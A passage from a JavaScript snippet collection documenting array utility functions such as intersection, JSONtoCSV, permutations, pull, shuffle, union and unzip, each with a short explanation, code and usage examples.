...args.slice(1)));\n\nExamples\ninitializeNDArray(1, 3); // [1,1,1]\ninitializeNDArray(5, 2, 2, 2); // [[[5,5],[5,5]],[[5,5],[5,5]]]\n\n\u2b06 Back to top\nintersection\nReturns a list of elements that exist in both arrays.\nCreate a Set from b, then use Array.prototype.filter() on a to only keep values contained in b.\nconst intersection = (a, b) => {\n  const s = new Set(b);\n  return a.filter(x => s.has(x));\n};\n\nExamples\nintersection([1, 2, 3], [4, 3, 2]); // [2, 3]\n\n\u2b06 Back to top\nintersectionBy\nReturns a list of elements that exist in both arrays, after applying the provided function to each array element of both.\nCreate a Set by applying fn to all elements in b, then use Array.prototype.filter() on a to only keep elements, which produce values contained in b when fn is applied to them.\nconst intersectionBy = (a, b, fn) => {\n  const s = new Set(b.map(fn));\n  return a.filter(x => s.has(fn(x)));\n};\n\nExamples\nintersectionBy([2.1, 1.2], [2.3, 3.4], Math.floor); // [2.1]\n\n\u2b06 Back to top\nintersectionWith\nReturns a list of elements that exist in both arrays, using a provided comparator function.\nUse Array.prototype.filter() and Array.prototype.findIndex() in combination with the provided comparator to determine intersecting values.\nconst intersectionWith = (a, b, comp) => a.filter(x => b.findIndex(y => comp(x, y)) !== -1);\n\nExamples\nintersectionWith([1, 1.2, 1.5, 3, 0], [1.9, 3, 0, 3.9], (a, b) => Math.round(a) === Math.round(b)); // [1.5, 3, 0]\n\n\u2b06 Back to top\nisSorted\nReturns 1 if the array is sorted in ascending order, -1 if it is sorted in descending order or 0 if it is not sorted.\nCalculate the ordering direction for the first two elements.\nUse Object.entries() to loop over array objects and compare them in pairs.\nReturn 0 if the direction changes or the direction if the last element is reached.\nconst isSorted = arr => {\n  let direction = -(arr[0] - arr[1]);\n  for (let [i, val] of arr.entries()) {\n    direction = !direction ? -(arr[i - 1] - arr[i]) : direction;\n    if (i === arr.length - 1) return !direction ? 0 : direction;\n    else if ((val - arr[i + 1]) * direction > 0) return 0;\n  }\n};\n\nExamples\nisSorted([0, 1, 2, 2]); // 1\nisSorted([4, 3, 2]); // -1\nisSorted([4, 3, 5]); // 0\n\n\u2b06 Back to top\njoin\nJoins all elements of an array into a string and returns this string.\nUses a separator and an end separator.\nUse Array.prototype.reduce() to combine elements into a string.\nOmit the second argument, separator, to use a default separator of ','.\nOmit the third argument, end, to use the same value as separator by default.\nconst join = (arr, separator = ',', end = separator) =>\n  arr.reduce(\n    (acc, val, i) =>\n      i === arr.length - 2\n        ? acc + val + end\n        : i === arr.length - 1\n          ? acc + val\n          : acc + val + separator,\n    ''\n  );\n\nExamples\njoin(['pen', 'pineapple', 'apple', 'pen'], ',', '&'); // \"pen,pineapple,apple&pen\"\njoin(['pen', 'pineapple', 'apple', 'pen'], ','); // \"pen,pineapple,apple,pen\"\njoin(['pen', 'pineapple', 'apple', 'pen']); // \"pen,pineapple,apple,pen\"\n\n\u2b06 Back to top\nJSONtoCSV \nConverts an array of objects to a comma-separated values (CSV) string that contains only the columns specified.\nUse Array.prototype.join(delimiter) to combine all the names in columns to create the first row.\nUse Array.prototype.map() and Array.prototype.reduce() to create a row for each object, substituting non-existent values with empty strings and only mapping values in columns.\nUse Array.prototype.join('\\n') to combine all rows into a string.\nOmit the third argument, delimiter, to use a default delimiter of ,.\nconst JSONtoCSV = (arr, columns, delimiter = ',') =>\n  [\n    columns.join(delimiter),\n    ...arr.map(obj =>\n      columns.reduce(\n        (acc, key) => `${acc}${!acc.length ? '' : delimiter}\"${!obj[key] ? '' : obj[key]}\"`,\n        ''\n      )\n    )\n  ].join('\\n');\n\nExamples\nJSONtoCSV([{ a: 1, b: 2 }, { a: 3, b: 4, c: 5 }, { a: 6 }, { b: 7 }], ['a', 'b']); // 'a,b\\n\"1\",\"2\"\\n\"3\",\"4\"\\n\"6\",\"\"\\n\"\",\"7\"'\nJSONtoCSV([{ a: 1, b: 2 }, { a: 3, b: 4, c: 5 }, { a: 6 }, { b: 7 }], ['a', 'b'], ';'); // 'a;b\\n\"1\";\"2\"\\n\"3\";\"4\"\\n\"6\";\"\"\\n\"\";\"7\"'\n\n\u2b06 Back to top\nlast\nReturns the last element in an array.\nUse arr.length - 1 to compute the index of the last element of the given array and returning it.\nconst last = arr => arr[arr.length - 1];\n\nExamples\nlast([1, 2, 3]); // 3\n\n\u2b06 Back to top\nlongestItem\nTakes any number of iterable objects or objects with a length property and returns the longest one.\nIf multiple objects have the same length, the first one will be returned.\nReturns undefined if no arguments are provided.\nUse Array.prototype.reduce(), comparing the length of objects to find the longest one.\nconst longestItem = (...vals) => vals.reduce((a, x) => (x.length > a.length ? x : a));\n\nExamples\nlongestItem('this', 'is', 'a', 'testcase'); // 'testcase'\nlongestItem(...['a', 'ab', 'abc']); // 'abc'\nlongestItem(...['a', 'ab', 'abc'], 'abcd'); // 'abcd'\nlongestItem([1, 2, 3], [1, 2], [1, 2, 3, 4, 5]); // [1, 2, 3, 4, 5]\nlongestItem([1, 2, 3], 'foobar'); // 'foobar'\n\n\u2b06 Back to top\nmapObject \nMaps the values of an array to an object using a function, where the key-value pairs consist of the original value as the key and the mapped value.\nUse an anonymous inner function scope to declare an undefined memory space, using closures to store a return value. Use a new Array to store the array with a map of the function over its data set and a comma operator to return a second step, without needing to move from one context to another (due to closures and order of operations).\nconst mapObject = (arr, fn) =>\n  (a => (\n    (a = [arr, arr.map(fn)]), a[0].reduce((acc, val, ind) => ((acc[val] = a[1][ind]), acc), {})\n  ))();\n\nExamples\nconst squareIt = arr => mapObject(arr, a => a * a);\nsquareIt([1, 2, 3]); // { 1: 1, 2: 4, 3: 9 }\n\n\u2b06 Back to top\nmaxN\nReturns the n maximum elements from the provided array.\nIf n is greater than or equal to the provided array's length, then return the original array (sorted in descending order).\nUse Array.prototype.sort() combined with the spread operator (...) to create a shallow clone of the array and sort it in descending order.\nUse Array.prototype.slice() to get the specified number of elements.\nOmit the second argument, n, to get a one-element array.\nconst maxN = (arr, n = 1) => [...arr].sort((a, b) => b - a).slice(0, n);\n\nExamples\nmaxN([1, 2, 3]); // [3]\nmaxN([1, 2, 3], 2); // [3,2]\n\n\u2b06 Back to top\nminN\nReturns the n minimum elements from the provided array.\nIf n is greater than or equal to the provided array's length, then return the original array (sorted in ascending order).\nUse Array.prototype.sort() combined with the spread operator (...) to create a shallow clone of the array and sort it in ascending order.\nUse Array.prototype.slice() to get the specified number of elements.\nOmit the second argument, n, to get a one-element array.\nconst minN = (arr, n = 1) => [...arr].sort((a, b) => a - b).slice(0, n);\n\nExamples\nminN([1, 2, 3]); // [1]\nminN([1, 2, 3], 2); // [1,2]\n\n\u2b06 Back to top\nnone\nReturns true if the provided predicate function returns false for all elements in a collection, false otherwise.\nUse Array.prototype.some() to test if any elements in the collection return true based on fn.\nOmit the second argument, fn, to use Boolean as a default.\nconst none = (arr, fn = Boolean) => !arr.some(fn);\n\nExamples\nnone([0, 1, 3, 0], x => x == 2); // true\nnone([0, 0, 0]); // true\n\n\u2b06 Back to top\nnthElement\nReturns the nth element of an array.\nUse Array.prototype.slice() to get an array containing the nth element at the first place.\nIf the index is out of bounds, return undefined.\nOmit the second argument, n, to get the first element of the array.\nconst nthElement = (arr, n = 0) => (n === -1 ? arr.slice(n) : arr.slice(n, n + 1))[0];\n\nExamples\nnthElement(['a', 'b', 'c'], 1); // 'b'\nnthElement(['a', 'b', 'b'], -3); // 'a'\n\n\u2b06 Back to top\noffset\nMoves the specified amount of elements to the end of the array.\nUse Array.prototype.slice() twice to get the elements after the specified index and the elements before that.\nUse the spread operator(...) to combine the two into one array.\nIf offset is negative, the elements will be moved from end to start.\nconst offset = (arr, offset) => [...arr.slice(offset), ...arr.slice(0, offset)];\n\nExamples\noffset([1, 2, 3, 4, 5], 2); // [3, 4, 5, 1, 2]\noffset([1, 2, 3, 4, 5], -2); // [4, 5, 1, 2, 3]\n\n\u2b06 Back to top\npartition\nGroups the elements into two arrays, depending on the provided function's truthiness for each element.\nUse Array.prototype.reduce() to create an array of two arrays.\nUse Array.prototype.push() to add elements for which fn returns true to the first array and elements for which fn returns false to the second one.\nconst partition = (arr, fn) =>\n  arr.reduce(\n    (acc, val, i, arr) => {\n      acc[fn(val, i, arr) ? 0 : 1].push(val);\n      return acc;\n    },\n    [[], []]\n  );\n\nExamples\nconst users = [{ user: 'barney', age: 36, active: false }, { user: 'fred', age: 40, active: true }];\npartition(users, o => o.active); // [[{ 'user': 'fred',    'age': 40, 'active': true }],[{ 'user': 'barney',  'age': 36, 'active': false }]]\n\n\u2b06 Back to top\npermutations \n\u26a0\ufe0f WARNING: This function's execution time increases exponentially with each array element. Anything more than 8 to 10 entries will cause your browser to hang as it tries to solve all the different combinations.\nGenerates all permutations of an array's elements (contains duplicates).\nUse recursion.\nFor each element in the given array, create all the partial permutations for the rest of its elements.\nUse Array.prototype.map() to combine the element with each partial permutation, then Array.prototype.reduce() to combine all permutations in one array.\nBase cases are for array length equal to 2 or 1.\nconst permutations = arr => {\n  if (arr.length <= 2) return arr.length === 2 ? [arr, [arr[1], arr[0]]] : arr;\n  return arr.reduce(\n    (acc, item, i) =>\n      acc.concat(\n        permutations([...arr.slice(0, i), ...arr.slice(i + 1)]).map(val => [item, ...val])\n      ),\n    []\n  );\n};\n\nExamples\npermutations([1, 33, 5]); // [ [ 1, 33, 5 ], [ 1, 5, 33 ], [ 33, 1, 5 ], [ 33, 5, 1 ], [ 5, 1, 33 ], [ 5, 33, 1 ] ]\n\n\u2b06 Back to top\npull\nMutates the original array to filter out the values specified.\nUse Array.prototype.filter() and Array.prototype.includes() to pull out the values that are not needed.\nUse Array.prototype.length = 0 to mutate the passed in an array by resetting it's length to zero and Array.prototype.push() to re-populate it with only the pulled values.\n(For a snippet that does not mutate the original array see without)\nconst pull = (arr, ...args) => {\n  let argState = Array.isArray(args[0]) ? args[0] : args;\n  let pulled = arr.filter((v, i) => !argState.includes(v));\n  arr.length = 0;\n  pulled.forEach(v => arr.push(v));\n};\n\nExamples\nlet myArray = ['a', 'b', 'c', 'a', 'b', 'c'];\npull(myArray, 'a', 'c'); // myArray = [ 'b', 'b' ]\n\n\u2b06 Back to top\npullAtIndex \nMutates the original array to filter out the values at the specified indexes.\nUse Array.prototype.filter() and Array.prototype.includes() to pull out the values that are not needed.\nUse Array.prototype.length = 0 to mutate the passed in an array by resetting it's length to zero and Array.prototype.push() to re-populate it with only the pulled values.\nUse Array.prototype.push() to keep track of pulled values\nconst pullAtIndex = (arr, pullArr) => {\n  let removed = [];\n  let pulled = arr\n    .map((v, i) => (pullArr.includes(i) ? removed.push(v) : v))\n    .filter((v, i) => !pullArr.includes(i));\n  arr.length = 0;\n  pulled.forEach(v => arr.push(v));\n  return removed;\n};\n\nExamples\nlet myArray = ['a', 'b', 'c', 'd'];\nlet pulled = pullAtIndex(myArray, [1, 3]); // myArray = [ 'a', 'c' ] , pulled = [ 'b', 'd' ]\n\n\u2b06 Back to top\npullAtValue \nMutates the original array to filter out the values specified. Returns the removed elements.\nUse Array.prototype.filter() and Array.prototype.includes() to pull out the values that are not needed.\nUse Array.prototype.length = 0 to mutate the passed in an array by resetting it's length to zero and Array.prototype.push() to re-populate it with only the pulled values.\nUse Array.prototype.push() to keep track of pulled values\nconst pullAtValue = (arr, pullArr) => {\n  let removed = [],\n    pushToRemove = arr.forEach((v, i) => (pullArr.includes(v) ? removed.push(v) : v)),\n    mutateTo = arr.filter((v, i) => !pullArr.includes(v));\n  arr.length = 0;\n  mutateTo.forEach(v => arr.push(v));\n  return removed;\n};\n\nExamples\nlet myArray = ['a', 'b', 'c', 'd'];\nlet pulled = pullAtValue(myArray, ['b', 'd']); // myArray = [ 'a', 'c' ] , pulled = [ 'b', 'd' ]\n\n\u2b06 Back to top\npullBy \nMutates the original array to filter out the values specified, based on a given iterator function.\nCheck if the last argument provided in a function.\nUse Array.prototype.map() to apply the iterator function fn to all array elements.\nUse Array.prototype.filter() and Array.prototype.includes() to pull out the values that are not needed.\nUse Array.prototype.length = 0 to mutate the passed in an array by resetting it's length to zero and Array.prototype.push() to re-populate it with only the pulled values.\nconst pullBy = (arr, ...args) => {\n  const length = args.length;\n  let fn = length > 1 ? args[length - 1] : undefined;\n  fn = typeof fn == 'function' ? (args.pop(), fn) : undefined;\n  let argState = (Array.isArray(args[0]) ? args[0] : args).map(val => fn(val));\n  let pulled = arr.filter((v, i) => !argState.includes(fn(v)));\n  arr.length = 0;\n  pulled.forEach(v => arr.push(v));\n};\n\nExamples\nvar myArray = [{ x: 1 }, { x: 2 }, { x: 3 }, { x: 1 }];\npullBy(myArray, [{ x: 1 }, { x: 3 }], o => o.x); // myArray = [{ x: 2 }]\n\n\u2b06 Back to top\nreducedFilter\nFilter an array of objects based on a condition while also filtering out unspecified keys.\nUse Array.prototype.filter() to filter the array based on the predicate fn so that it returns the objects for which the condition returned a truthy value.\nOn the filtered array, use Array.prototype.map() to return the new object using Array.prototype.reduce() to filter out the keys which were not supplied as the keys argument.\nconst reducedFilter = (data, keys, fn) =>\n  data.filter(fn).map(el =>\n    keys.reduce((acc, key) => {\n      acc[key] = el[key];\n      return acc;\n    }, {})\n  );\n\nExamples\nconst data = [\n  {\n    id: 1,\n    name: 'john',\n    age: 24\n  },\n  {\n    id: 2,\n    name: 'mike',\n    age: 50\n  }\n];\n\nreducedFilter(data, ['id', 'name'], item => item.age > 24); // [{ id: 2, name: 'mike'}]\n\n\u2b06 Back to top\nreduceSuccessive\nApplies a function against an accumulator and each element in the array (from left to right), returning an array of successively reduced values.\nUse Array.prototype.reduce() to apply the given function to the given array, storing each new result.\nconst reduceSuccessive = (arr, fn, acc) =>\n  arr.reduce((res, val, i, arr) => (res.push(fn(res.slice(-1)[0], val, i, arr)), res), [acc]);\n\nExamples\nreduceSuccessive([1, 2, 3, 4, 5, 6], (acc, val) => acc + val, 0); // [0, 1, 3, 6, 10, 15, 21]\n\n\u2b06 Back to top\nreduceWhich\nReturns the minimum/maximum value of an array, after applying the provided function to set comparing rule.\nUse Array.prototype.reduce() in combination with the comparator function to get the appropriate element in the array.\nYou can omit the second parameter, comparator, to use the default one that returns the minimum element in the array.\nconst reduceWhich = (arr, comparator = (a, b) => a - b) =>\n  arr.reduce((a, b) => (comparator(a, b) >= 0 ? b : a));\n\nExamples\nreduceWhich([1, 3, 2]); // 1\nreduceWhich([1, 3, 2], (a, b) => b - a); // 3\nreduceWhich(\n  [{ name: 'Tom', age: 12 }, { name: 'Jack', age: 18 }, { name: 'Lucy', age: 9 }],\n  (a, b) => a.age - b.age\n); // {name: \"Lucy\", age: 9}\n\n\u2b06 Back to top\nreject\nTakes a predicate and array, like Array.prototype.filter(), but only keeps x if pred(x) === false.\nconst reject = (pred, array) => array.filter((...args) => !pred(...args));\n\nExamples\nreject(x => x % 2 === 0, [1, 2, 3, 4, 5]); // [1, 3, 5]\nreject(word => word.length > 4, ['Apple', 'Pear', 'Kiwi', 'Banana']); // ['Pear', 'Kiwi']\n\n\u2b06 Back to top\nremove\nRemoves elements from an array for which the given function returns false.\nUse Array.prototype.filter() to find array elements that return truthy values and Array.prototype.reduce() to remove elements using Array.prototype.splice().\nThe func is invoked with three arguments (value, index, array).\nconst remove = (arr, func) =>\n  Array.isArray(arr)\n    ? arr.filter(func).reduce((acc, val) => {\n      arr.splice(arr.indexOf(val), 1);\n      return acc.concat(val);\n    }, [])\n    : [];\n\nExamples\nremove([1, 2, 3, 4], n => n % 2 === 0); // [2, 4]\n\n\u2b06 Back to top\nsample\nReturns a random element from an array.\nUse Math.random() to generate a random number, multiply it by length and round it off to the nearest whole number using Math.floor().\nThis method also works with strings.\nconst sample = arr => arr[Math.floor(Math.random() * arr.length)];\n\nExamples\nsample([3, 7, 9, 11]); // 9\n\n\u2b06 Back to top\nsampleSize\nGets n random elements at unique keys from array up to the size of array.\nShuffle the array using the Fisher-Yates algorithm.\nUse Array.prototype.slice() to get the first n elements.\nOmit the second argument, n to get only one element at random from the array.\nconst sampleSize = ([...arr], n = 1) => {\n  let m = arr.length;\n  while (m) {\n    const i = Math.floor(Math.random() * m--);\n    [arr[m], arr[i]] = [arr[i], arr[m]];\n  }\n  return arr.slice(0, n);\n};\n\nExamples\nsampleSize([1, 2, 3], 2); // [3,1]\nsampleSize([1, 2, 3], 4); // [2,3,1]\n\n\u2b06 Back to top\nshank\nHas the same functionality as Array.prototype.splice(), but returning a new array instead of mutating the original array.\nUse Array.prototype.slice() and Array.prototype.concat() to get a new array with the new contents after removing existing elements and/or adding new elements.\nOmit the second argument, index, to start at 0.\nOmit the third argument, delCount, to remove 0 elements.\nOmit the fourth argument, elements, in order to not add any new elements.\nconst shank = (arr, index = 0, delCount = 0, ...elements) =>\n  arr\n    .slice(0, index)\n    .concat(elements)\n    .concat(arr.slice(index + delCount));\n\nExamples\nconst names = ['alpha', 'bravo', 'charlie'];\nconst namesAndDelta = shank(names, 1, 0, 'delta'); // [ 'alpha', 'delta', 'bravo', 'charlie' ]\nconst namesNoBravo = shank(names, 1, 1); // [ 'alpha', 'charlie' ]\nconsole.log(names); // ['alpha', 'bravo', 'charlie']\n\n\u2b06 Back to top\nshuffle\nRandomizes the order of the values of an array, returning a new array.\nUses the Fisher-Yates algorithm to reorder the elements of the array.\nconst shuffle = ([...arr]) => {\n  let m = arr.length;\n  while (m) {\n    const i = Math.floor(Math.random() * m--);\n    [arr[m], arr[i]] = [arr[i], arr[m]];\n  }\n  return arr;\n};\n\nExamples\nconst foo = [1, 2, 3];\nshuffle(foo); // [2, 3, 1], foo = [1, 2, 3]\n\n\u2b06 Back to top\nsimilarity\nReturns an array of elements that appear in both arrays.\nUse Array.prototype.filter() to remove values that are not part of values, determined using Array.prototype.includes().\nconst similarity = (arr, values) => arr.filter(v => values.includes(v));\n\nExamples\nsimilarity([1, 2, 3], [1, 2, 4]); // [1, 2]\n\n\u2b06 Back to top\nsortedIndex\nReturns the lowest index at which value should be inserted into array in order to maintain its sort order.\nCheck if the array is sorted in descending order (loosely).\nUse Array.prototype.findIndex() to find the appropriate index where the element should be inserted.\nconst sortedIndex = (arr, n) => {\n  const isDescending = arr[0] > arr[arr.length - 1];\n  const index = arr.findIndex(el => (isDescending ? n >= el : n <= el));\n  return index === -1 ? arr.length : index;\n};\n\nExamples\nsortedIndex([5, 3, 2, 1], 4); // 1\nsortedIndex([30, 50], 40); // 1\n\n\u2b06 Back to top\nsortedIndexBy\nReturns the lowest index at which value should be inserted into array in order to maintain its sort order, based on a provided iterator function.\nCheck if the array is sorted in descending order (loosely).\nUse Array.prototype.findIndex() to find the appropriate index where the element should be inserted, based on the iterator function fn.\nconst sortedIndexBy = (arr, n, fn) => {\n  const isDescending = fn(arr[0]) > fn(arr[arr.length - 1]);\n  const val = fn(n);\n  const index = arr.findIndex(el => (isDescending ? val >= fn(el) : val <= fn(el)));\n  return index === -1 ? arr.length : index;\n};\n\nExamples\nsortedIndexBy([{ x: 4 }, { x: 5 }], { x: 4 }, o => o.x); // 0\n\n\u2b06 Back to top\nsortedLastIndex\nReturns the highest index at which value should be inserted into array in order to maintain its sort order.\nCheck if the array is sorted in descending order (loosely).\nUse Array.prototype.reverse() and Array.prototype.findIndex() to find the appropriate last index where the element should be inserted.\nconst sortedLastIndex = (arr, n) => {\n  const isDescending = arr[0] > arr[arr.length - 1];\n  const index = arr.reverse().findIndex(el => (isDescending ? n <= el : n >= el));\n  return index === -1 ? 0 : arr.length - index;\n};\n\nExamples\nsortedLastIndex([10, 20, 30, 30, 40], 30); // 4\n\n\u2b06 Back to top\nsortedLastIndexBy\nReturns the highest index at which value should be inserted into array in order to maintain its sort order, based on a provided iterator function.\nCheck if the array is sorted in descending order (loosely).\nUse Array.prototype.map() to apply the iterator function to all elements of the array.\nUse Array.prototype.reverse() and Array.prototype.findIndex() to find the appropriate last index where the element should be inserted, based on the provided iterator function.\nconst sortedLastIndexBy = (arr, n, fn) => {\n  const isDescending = fn(arr[0]) > fn(arr[arr.length - 1]);\n  const val = fn(n);\n  const index = arr\n    .map(fn)\n    .reverse()\n    .findIndex(el => (isDescending ? val <= el : val >= el));\n  return index === -1 ? 0 : arr.length - index;\n};\n\nExamples\nsortedLastIndexBy([{ x: 4 }, { x: 5 }], { x: 4 }, o => o.x); // 1\n\n\u2b06 Back to top\nstableSort \nPerforms stable sorting of an array, preserving the initial indexes of items when their values are the same.\nDoes not mutate the original array, but returns a new array instead.\nUse Array.prototype.map() to pair each element of the input array with its corresponding index.\nUse Array.prototype.sort() and a compare function to sort the list, preserving their initial order if the items compared are equal.\nUse Array.prototype.map() to convert back to the initial array items.\nconst stableSort = (arr, compare) =>\n  arr\n    .map((item, index) => ({ item, index }))\n    .sort((a, b) => compare(a.item, b.item) || a.index - b.index)\n    .map(({ item }) => item);\n\nExamples\nconst arr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\nconst stable = stableSort(arr, () => 0); // [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n\n\u2b06 Back to top\nsymmetricDifference\nReturns the symmetric difference between two arrays, without filtering out duplicate values.\nCreate a Set from each array, then use Array.prototype.filter() on each of them to only keep values not contained in the other.\nconst symmetricDifference = (a, b) => {\n  const sA = new Set(a),\n    sB = new Set(b);\n  return [...a.filter(x => !sB.has(x)), ...b.filter(x => !sA.has(x))];\n};\n\nExamples\nsymmetricDifference([1, 2, 3], [1, 2, 4]); // [3, 4]\nsymmetricDifference([1, 2, 2], [1, 3, 1]); // [2, 2, 3]\n\n\u2b06 Back to top\nsymmetricDifferenceBy\nReturns the symmetric difference between two arrays, after applying the provided function to each array element of both.\nCreate a Set by applying fn to each array's elements, then use Array.prototype.filter() on each of them to only keep values not contained in the other.\nconst symmetricDifferenceBy = (a, b, fn) => {\n  const sA = new Set(a.map(v => fn(v))),\n    sB = new Set(b.map(v => fn(v)));\n  return [...a.filter(x => !sB.has(fn(x))), ...b.filter(x => !sA.has(fn(x)))];\n};\n\nExamples\nsymmetricDifferenceBy([2.1, 1.2], [2.3, 3.4], Math.floor); // [ 1.2, 3.4 ]\n\n\u2b06 Back to top\nsymmetricDifferenceWith\nReturns the symmetric difference between two arrays, using a provided function as a comparator.\nUse Array.prototype.filter() and Array.prototype.findIndex() to find the appropriate values.\nconst symmetricDifferenceWith = (arr, val, comp) => [\n  ...arr.filter(a => val.findIndex(b => comp(a, b)) === -1),\n  ...val.filter(a => arr.findIndex(b => comp(a, b)) === -1)\n];\n\nExamples\nsymmetricDifferenceWith(\n  [1, 1.2, 1.5, 3, 0],\n  [1.9, 3, 0, 3.9],\n  (a, b) => Math.round(a) === Math.round(b)\n); // [1, 1.2, 3.9]\n\n\u2b06 Back to top\ntail\nReturns all elements in an array except for the first one.\nReturn Array.prototype.slice(1) if the array's length is more than 1, otherwise, return the whole array.\nconst tail = arr => (arr.length > 1 ? arr.slice(1) : arr);\n\nExamples\ntail([1, 2, 3]); // [2,3]\ntail([1]); // [1]\n\n\u2b06 Back to top\ntake\nReturns an array with n elements removed from the beginning.\nUse Array.prototype.slice() to create a slice of the array with n elements taken from the beginning.\nconst take = (arr, n = 1) => arr.slice(0, n);\n\nExamples\ntake([1, 2, 3], 5); // [1, 2, 3]\ntake([1, 2, 3], 0); // []\n\n\u2b06 Back to top\ntakeRight\nReturns an array with n elements removed from the end.\nUse Array.prototype.slice() to create a slice of the array with n elements taken from the end.\nconst takeRight = (arr, n = 1) => arr.slice(arr.length - n, arr.length);\n\nExamples\ntakeRight([1, 2, 3], 2); // [ 2, 3 ]\ntakeRight([1, 2, 3]); // [3]\n\n\u2b06 Back to top\ntakeRightWhile\nRemoves elements from the end of an array until the passed function returns true. Returns the removed elements.\nLoop through the array, using a Array.prototype.reduceRight() and accumulating elements while the function returns falsy value.\nconst takeRightWhile = (arr, func) =>\n  arr.reduceRight((acc, el) => (func(el) ? acc : [el, ...acc]), []);\n\nExamples\ntakeRightWhile([1, 2, 3, 4], n => n < 3); // [3, 4]\n\n\u2b06 Back to top\ntakeWhile\nRemoves elements in an array until the passed function returns true. Returns the removed elements.\nLoop through the array, using a for...of loop over Array.prototype.entries() until the returned value from the function is true.\nReturn the removed elements, using Array.prototype.slice().\nconst takeWhile = (arr, func) => {\n  for (const [i, val] of arr.entries()) if (func(val)) return arr.slice(0, i);\n  return arr;\n};\n\nExamples\ntakeWhile([1, 2, 3, 4], n => n >= 3); // [1, 2]\n\n\u2b06 Back to top\ntoHash\nReduces a given Array-like into a value hash (keyed data store).\nGiven an Iterable or Array-like structure, call Array.prototype.reduce.call() on the provided object to step over it and return an Object, keyed by the reference value.\nconst toHash = (object, key) =>\n  Array.prototype.reduce.call(\n    object,\n    (acc, data, index) => ((acc[!key ? index : data[key]] = data), acc),\n    {}\n  );\n\nExamples\ntoHash([4, 3, 2, 1]); // { 0: 4, 1: 3, 2: 2, 3: 1 }\ntoHash([{ a: 'label' }], 'a'); // { label: { a: 'label' } }\n// A more in depth example:\nlet users = [{ id: 1, first: 'Jon' }, { id: 2, first: 'Joe' }, { id: 3, first: 'Moe' }];\nlet managers = [{ manager: 1, employees: [2, 3] }];\n// We use function here because we want a bindable reference, but a closure referencing the hash would work, too.\nmanagers.forEach(\n  manager =>\n    (manager.employees = manager.employees.map(function(id) {\n      return this[id];\n    }, toHash(users, 'id')))\n);\nmanagers; // [ { manager:1, employees: [ { id: 2, first: \"Joe\" }, { id: 3, first: \"Moe\" } ] } ]\n\n\u2b06 Back to top\nunion\nReturns every element that exists in any of the two arrays once.\nCreate a Set with all values of a and b and convert to an array.\nconst union = (a, b) => Array.from(new Set([...a, ...b]));\n\nExamples\nunion([1, 2, 3], [4, 3, 2]); // [1,2,3,4]\n\n\u2b06 Back to top\nunionBy\nReturns every element that exists in any of the two arrays once, after applying the provided function to each array element of both.\nCreate a Set by applying all fn to all values of a.\nCreate a Set from a and all elements in b whose value, after applying fn does not match a value in the previously created set.\nReturn the last set converted to an array.\nconst unionBy = (a, b, fn) => {\n  const s = new Set(a.map(fn));\n  return Array.from(new Set([...a, ...b.filter(x => !s.has(fn(x)))]));\n};\n\nExamples\nunionBy([2.1], [1.2, 2.3], Math.floor); // [2.1, 1.2]\n\n\u2b06 Back to top\nunionWith\nReturns every element that exists in any of the two arrays once, using a provided comparator function.\nCreate a Set with all values of a and values in b for which the comparator finds no matches in a, using Array.prototype.findIndex().\nconst unionWith = (a, b, comp) =>\n  Array.from(new Set([...a, ...b.filter(x => a.findIndex(y => comp(x, y)) === -1)]));\n\nExamples\nunionWith([1, 1.2, 1.5, 3, 0], [1.9, 3, 0, 3.9], (a, b) => Math.round(a) === Math.round(b)); // [1, 1.2, 1.5, 3, 0, 3.9]\n\n\u2b06 Back to top\nuniqueElements\nReturns all unique values of an array.\nUse ES6 Set and the ...rest operator to discard all duplicated values.\nconst uniqueElements = arr => [...new Set(arr)];\n\nExamples\nuniqueElements([1, 2, 2, 3, 4, 4, 5]); // [1, 2, 3, 4, 5]\n\n\u2b06 Back to top\nuniqueElementsBy\nReturns all unique values of an array, based on a provided comparator function.\nUse Array.prototype.reduce() and Array.prototype.some() for an array containing only the first unique occurrence of each value, based on the comparator function, fn.\nThe comparator function takes two arguments: the values of the two elements being compared.\nconst uniqueElementsBy = (arr, fn) =>\n  arr.reduce((acc, v) => {\n    if (!acc.some(x => fn(v, x))) acc.push(v);\n    return acc;\n  }, []);\n\nExamples\nuniqueElementsBy(\n  [\n    { id: 0, value: 'a' },\n    { id: 1, value: 'b' },\n    { id: 2, value: 'c' },\n    { id: 1, value: 'd' },\n    { id: 0, value: 'e' }\n  ],\n  (a, b) => a.id == b.id\n); // [ { id: 0, value: 'a' }, { id: 1, value: 'b' }, { id: 2, value: 'c' } ]\n\n\u2b06 Back to top\nuniqueElementsByRight\nReturns all unique values of an array, based on a provided comparator function.\nUse Array.prototype.reduce() and Array.prototype.some() for an array containing only the last unique occurrence of each value, based on the comparator function, fn.\nThe comparator function takes two arguments: the values of the two elements being compared.\nconst uniqueElementsByRight = (arr, fn) =>\n  arr.reduceRight((acc, v) => {\n    if (!acc.some(x => fn(v, x))) acc.push(v);\n    return acc;\n  }, []);\n\nExamples\nuniqueElementsByRight(\n  [\n    { id: 0, value: 'a' },\n    { id: 1, value: 'b' },\n    { id: 2, value: 'c' },\n    { id: 1, value: 'd' },\n    { id: 0, value: 'e' }\n  ],\n  (a, b) => a.id == b.id\n); // [ { id: 0, value: 'e' }, { id: 1, value: 'd' }, { id: 2, value: 'c' } ]\n\n\u2b06 Back to top\nuniqueSymmetricDifference\nReturns the unique symmetric difference between two arrays, not containing duplicate values from either array.\nUse Array.prototype.filter() and Array.prototype.includes() on each array to remove values contained in the other, then create a Set from the results, removing duplicate values.\nconst uniqueSymmetricDifference = (a, b) => [\n  ...new Set([...a.filter(v => !b.includes(v)), ...b.filter(v => !a.includes(v))])\n];\n\nExamples\nuniqueSymmetricDifference([1, 2, 3], [1, 2, 4]); // [3, 4]\nuniqueSymmetricDifference([1, 2, 2], [1, 3, 1]); // [2, 3]\n\n\u2b06 Back to top\nunzip\nCreates an array of arrays, ungrouping the elements in an array produced by zip.\nUse Math.max.apply() to get the longest subarray in the array, Array.prototype.map() to make each element an array.\nUse Array.prototype.reduce() and Array.prototype.forEach() to map grouped values to individual arrays.\nconst unzip = arr =>\n  arr.reduce(\n    (acc, val) => (val.forEach((v, i) => acc[i].push(v)), acc),\n    Array.from({\n      length: Math.max(...arr.map(x => x.length))\n    }).map(x => [])\n  );\n\nExamples\nunzip([['a', 1, true], ['b', 2, false]]); // [['a', 'b'], [1, 2], [true, false]]\nunzip([['a', 1, true], ['b', 2]]); // [['a', 'b'], [1, 2], [true]]\n\n\u2b06 Back to top\nunzipWith \nCreates an array of elements, ungrouping the elements in an array produced by zip and applying the provided function.\nUse Math.max.apply() to get the 